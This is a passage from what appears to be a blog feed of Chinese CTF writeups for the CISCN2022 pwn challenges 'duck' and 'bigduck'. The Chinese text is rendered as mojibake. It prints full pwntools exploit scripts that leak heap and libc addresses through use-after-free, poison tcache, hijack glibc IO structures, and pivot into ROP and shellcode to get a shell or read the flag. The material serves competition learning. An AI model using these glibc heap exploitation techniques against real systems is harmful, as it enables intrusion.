class="hljs-string">&#x27;\0&#x27;</span>)<br>payload += p64(len_rax_mprotect) + p64(<span class="hljs-number">0</span>) + p64(addr+<span class="hljs-number">0x38</span>) + shellcode<br>sea(<span class="hljs-string">&quot;please input your new data\n&quot;</span>,payload)<br><br>sleep(<span class="hljs-number">2</span>)<br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.cat(&#x27;./flag&#x27;,fd=2)))</span><br><span class="hljs-comment"># sl(&#x27;\0&#x27;*0x546+asm(shellcraft.write(2,&#x27;rsp&#x27;,&#x27;0x50&#x27;)))</span><br>sl(<span class="hljs-string">&#x27;\0&#x27;</span>*<span class="hljs-number">0x546</span>+asm(shellcraft.sh()))<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;exec 1&gt;&amp;0&#x27;</span>)<br>sleep(<span class="hljs-number">2</span>)<br>sl(<span class="hljs-string">&#x27;cat flag&#x27;</span>)<br>p.interactive()<br><br><br></code></pre></td></tr></table></figure><p>ä»€ä¹ˆï¼Œä½ è¯´å¤ç°å“ªå»äº†ï¼Ÿåœ¨å­¦äº†åœ¨å­¦äº†ã€‚ï¼ˆæ¶¦</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>CISCN2022 åä¸œåŒ—èµ›åŒº Pwn Writeup</title>
    <link href="/posts/2c3848ae.html"/>
    <url>/posts/2c3848ae.html</url>
    
    <content type="html"><![CDATA[<p>Pwn éš¾åº¦ä¸å¤§ï¼Œè‰è‰åœ°akäº†ï¼Œæœ€åä¹Ÿæ˜¯æ“¦è¾¹è¿›äº†å†³èµ›ï¼Œè¿˜æ˜¯æ¯”è¾ƒæœ‰æƒŠæ— é™©çš„ã€‚<s>ä½†æ˜¯ğŸ‘´å¤§é›¾å¥½åƒè¦ğŸ”äº†ï¼ŒğŸ‘´ä¸‹å»å¥½å¥½åæ€åæ€ã€‚</s>ï¼ˆç„¶è€Œæ²¡æœ‰ï¼‰å¦å¤–è¿™å°å¯çˆ±æ¯”èµ›Pwnå…¨åšäº†ç®—ä¸Šå‰ä¸‰çš„åŠ æˆğŸ‘´ä¹Ÿå°±1200+30+30+60ï¼Œæ„Ÿè§‰ä¸å¦‚éš”å£å–è¯ä¸€é¢˜1200+360ã€‚</p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220624170308020.png" alt="image-20220624170308020" style="zoom: 50%;" /><h2 id="duck"><a class="header-anchor" href="#duck">Â¶</a>duck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194732802.png" alt="image-20220619194732802"></p><p><strong>flag{693edf4763ef4cdd4f152794028b7f5e}</strong></p><p>libc 2.34 ä¸‹çš„ pwn é¢˜ï¼Œç»™çš„æ¼æ´æ¯”è¾ƒåŸºç¡€å°±æ˜¯ <strong>UAF</strong>ï¼ŒåŒæ—¶ç»™äº† Edit åŠŸèƒ½ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆç®€å•çš„ getshellã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨ UAF leak å †åœ°å€ï¼Œåˆ†é…å¹¶ Dele æ‰å¤šä¸ªå †å— leak libc</li><li>åˆ†é… chunk åˆ° Tcache çš„ entry å¤„ï¼Œåˆ©ç”¨ Edit å‡½æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä»»æ„åˆ†é…å †å—</li><li>ä¿®æ”¹æ‰ stderr çš„ flag ä¸º <code>/bin/sh\0</code></li><li>ä¿®æ”¹æ‰ <code>_IO_file_jumps</code> é‡Œçš„å‡½æ•°æŒ‡é’ˆä¸º <code>system</code> ï¼Œæœ€åæ”¹æ‰ Top Chunk çš„ size è¿›å…¥ <code>_IO_fflush</code> è§¦å‘ getshellã€‚</li></ol><p><strong>Exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58013</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1f2cc0</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>helper = libc_base + <span class="hljs-number">0x1f45c0</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(stderr)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,<span class="hljs-string">&#x27;/bin/sh\0&#x27;</span>)<br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(system_addr))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># add()</span><br><br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="bigduck"><a class="header-anchor" href="#bigduck">Â¶</a>bigduck</h2><p><img src="https://blog-1310088624.cos.ap-nanjing.myqcloud.com/blog/image-20220619194814107.png" alt="image-20220619194814107"></p><p><strong>flag{afae47ead2452a4b5ba629ec88635a51}</strong></p><p>libc 2.33 ä¸‹å¼€äº†æ²™ç›’çš„å †é¢˜ï¼Œå…¶ä»–éƒ¨åˆ†å’Œä¸Šé¢˜ä¸€æ ·ã€‚</p><p><strong>æ€è·¯</strong></p><ol><li>åˆ©ç”¨ UAF leak å †åœ°å€ï¼Œåˆ†é…å¹¶ Dele æ‰å¤šä¸ªå †å— leak libc</li><li>åˆ†é… chunk åˆ° Tcache çš„ entry å¤„ï¼Œåˆ©ç”¨ Edit å‡½æ•°æˆ‘ä»¬å¯ä»¥æ§åˆ¶ä»»æ„åˆ†é…å †å—</li><li>House of kiwi å®Œæˆæ ˆè¿ç§»ï¼Œæ‰§è¡Œ shellcode è¯»å– flag</li></ol><p><strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2</span><br><span class="hljs-comment"># -*- coding: utf-8 -*</span><br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>se      = <span class="hljs-keyword">lambda</span> data               :p.send(data) <br>sa      = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>sl      = <span class="hljs-keyword">lambda</span> data               :p.sendline(data)<br>sla     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendlineafter(delim, data)<br>sea     = <span class="hljs-keyword">lambda</span> delim,data         :p.sendafter(delim, data)<br>rc      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :p.recv(numb)<br>ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :p.recvuntil(delims, drop)<br>uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;\0&#x27;</span>))<br>lg = <span class="hljs-keyword">lambda</span> name,data : p.success(name + <span class="hljs-string">&#x27;: \033[1;36m 0x%x \033[0m&#x27;</span> % data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>(<span class="hljs-params"><span class="hljs-built_in">breakpoint</span>=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    glibc_dir = <span class="hljs-string">&#x27;~/Exps/Glibc/glibc-2.27/&#x27;</span><br>    gdbscript = <span class="hljs-string">&#x27;directory %smalloc/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdio-common/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %sstdlib/\n&#x27;</span> % glibc_dir<br>    gdbscript += <span class="hljs-string">&#x27;directory %slibio/\n&#x27;</span> % glibc_dir<br>    elf_base = <span class="hljs-built_in">int</span>(os.popen(<span class="hljs-string">&#x27;pmap &#123;&#125;| awk \x27&#123;&#123;print \x241&#125;&#125;\x27&#x27;</span>.<span class="hljs-built_in">format</span>(p.pid)).readlines()[<span class="hljs-number">1</span>], <span class="hljs-number">16</span>) <span class="hljs-keyword">if</span> elf.pie <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>    gdbscript += <span class="hljs-string">&#x27;b *&#123;:#x&#125;\n&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">breakpoint</span>) + elf_base) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(<span class="hljs-built_in">breakpoint</span>, <span class="hljs-built_in">int</span>) <span class="hljs-keyword">else</span> <span class="hljs-built_in">breakpoint</span><br>    gdb.attach(p, gdbscript)<br>    time.sleep(<span class="hljs-number">1</span>)<br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>context(arch = elf.arch, os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>,terminal = [<span class="hljs-string">&#x27;tmux&#x27;</span>, <span class="hljs-string">&#x27;splitw&#x27;</span>, <span class="hljs-string">&#x27;-hp&#x27;</span>,<span class="hljs-string">&#x27;62&#x27;</span>])<br><span class="hljs-comment"># p = process(&#x27;./pwn&#x27;)</span><br><span class="hljs-comment"># debug()</span><br>p = remote(<span class="hljs-string">&#x27;192.168.166.147&#x27;</span>,<span class="hljs-number">58011</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">menu</span>(<span class="hljs-params">c</span>):<br>    sla(<span class="hljs-string">&#x27;Choice: &#x27;</span>,<span class="hljs-built_in">str</span>(c))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>():<br>    menu(<span class="hljs-number">1</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dele</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">2</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    menu(<span class="hljs-number">3</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: \n&#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,data,size=<span class="hljs-number">0x100</span></span>):<br>    menu(<span class="hljs-number">4</span>)<br>    sla(<span class="hljs-string">&#x27;Idx: &#x27;</span>,<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>))<br>    sla(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    sea(<span class="hljs-string">&#x27;Content: &#x27;</span>,<span class="hljs-built_in">str</span>(data))<br><br><br>add()<br>dele(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>heap_leak = uu64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>))<br>heap_base = heap_leak &lt;&lt;<span class="hljs-number">12</span><br>lg(<span class="hljs-string">&#x27;heap_leak&#x27;</span>,heap_leak)<br>lg(<span class="hljs-string">&#x27;heap_base&#x27;</span>,heap_base)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>):<br>    add() <span class="hljs-comment"># 9</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>+<span class="hljs-number">8</span>):<br>    dele(i)<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;u&#x27;</span>)<br>show(<span class="hljs-number">8</span>)<br>libc_leak = uu64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>,drop=<span class="hljs-literal">False</span>)[-<span class="hljs-number">6</span>:])<br>libc_base = libc_leak - <span class="hljs-number">0x1e0c75</span><br>lg(<span class="hljs-string">&#x27;libc_leak&#x27;</span>,libc_leak)<br>lg(<span class="hljs-string">&#x27;libc_base&#x27;</span>,libc_base)<br><span class="hljs-comment">#libc = ELF(&#x27;./libc.so.6&#x27;)</span><br>libc = elf.libc<br>libc.address = libc_base<br>system_addr = libc.sym.system<br>bin_sh = libc.search(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>).<span class="hljs-built_in">next</span>()<br>edit(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\0&#x27;</span>)<br><br>stderr = libc_base + <span class="hljs-number">0x1f3680</span><br>sync = libc_base + <span class="hljs-number">0x1e24a0</span> + <span class="hljs-number">0x60</span><br>magic = libc_base + <span class="hljs-number">0x529ad</span><br>helper = libc_base + <span class="hljs-number">0x1e1940</span><br>ret = libc_base + <span class="hljs-number">0x0000000000026699</span><br>rdi = libc_base + <span class="hljs-number">0x0000000000028a55</span><br>rsi = libc_base + <span class="hljs-number">0x000000000002a4cf</span><br>rdx = libc_base + <span class="hljs-number">0x00000000000c7f32</span><br>addr = heap_base + <span class="hljs-number">0x400</span><br><br>mmp = flat([<br>    <span class="hljs-number">0</span>,rdi,((addr)&gt;&gt;<span class="hljs-number">12</span>)&lt;&lt;<span class="hljs-number">12</span>,rsi,<span class="hljs-number">0x2000</span>,rdx,<span class="hljs-number">7</span>,libc.sym.mprotect,rdi,<span class="hljs-number">0</span>,rsi,addr+<span class="hljs-number">0x400</span>,rdx,<span class="hljs-number">0x100</span>,libc.sym.read,libc_base + <span class="hljs-number">0x00000000000506b1</span><br>])<br><br>edit(<span class="hljs-number">0</span>,mmp)<br><span class="hljs-comment"># edit(1,mmp)</span><br><br>edit(<span class="hljs-number">7</span>,p64(heap_leak^(heap_base+<span class="hljs-number">0x100</span>)))<br>add() <span class="hljs-comment"># 11</span><br><span class="hljs-comment"># pause()</span><br>add() <span class="hljs-comment"># 12</span><br>edit(<span class="hljs-number">12</span>,p64(helper)*<span class="hljs-number">2</span>)<br>lg(<span class="hljs-string">&#x27;ADDR&#x27;</span>,(heap_base+<span class="hljs-number">0x100</span>))<br>add() <span class="hljs-comment"># 13</span><br>edit(<span class="hljs-number">13</span>,p64(heap_base+<span class="hljs-number">0x2a8</span>)+p64(ret))<br>edit(<span class="hljs-number">12</span>,p64(sync)*<span class="hljs-number">2</span>)<br>add()<br>edit(<span class="hljs-number">14</span>,p64(magic))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">3</span>):<br>    edit(<span class="hljs-number">12</span>,p64(heap_base+<span class="hljs-number">0xd30</span>)*<span class="hljs-number">2</span>)<br>    add()<br>    edit(<span class="hljs-number">15</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)<br><br>add()<br>add()<br>add()<br><br><span class="hljs-comment"># # add()</span><br>sleep(<span class="hljs-number">2</span>)<br>sl(asm(shellcraft.cat(<span class="hljs-string">&#x27;/flag&#x27;</span>)))<br>p.interactive()<br><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x0000000000028a55 : pop rdi ; ret</span><br><span class="hljs-string">0x0000000000112a51 : pop rdx ; pop r12 ; ret</span><br><span class="hljs-string">0x00000000001574e6 : pop rdx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000fc103 : pop rdx ; pop rcx ; pop rbx ; ret</span><br><span class="hljs-string">0x00000000000c7f32 : pop rdx ; ret</span><br><span class="hljs-string">0x0000000000095982 : pop rdx ; ret 0x11</span><br><span class="hljs-string">0x0000000000093342 : pop rdx ; ret 0xfffc</span><br><span class="hljs-string">0x0000000000028db0 : pop rsi ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a53 : pop rsi ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cf : pop rsi ; ret</span><br><span class="hljs-string">0x0000000000028dac : pop rsp ; pop r13 ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000028a4f : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="hljs-string">0x000000000002a4cb : pop rsp ; pop r13 ; pop r14 ; ret</span><br><span class="hljs-string">0x0000000000043922 : pop rsp ; pop r13 ; pop rbp ; ret</span><br><span class="hljs-string">0x000000000002a04c : pop rsp ; pop r13 ; ret</span><br><span class="hljs-string">0x00000000000de0e6 : pop rsp ; pop rbp ; ret</span><br><span class="hljs-string">0x0000000000033af2 : pop rsp ; ret</span><br><span class="hljs-string">0x0000000000026699 : ret</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="blue"><a 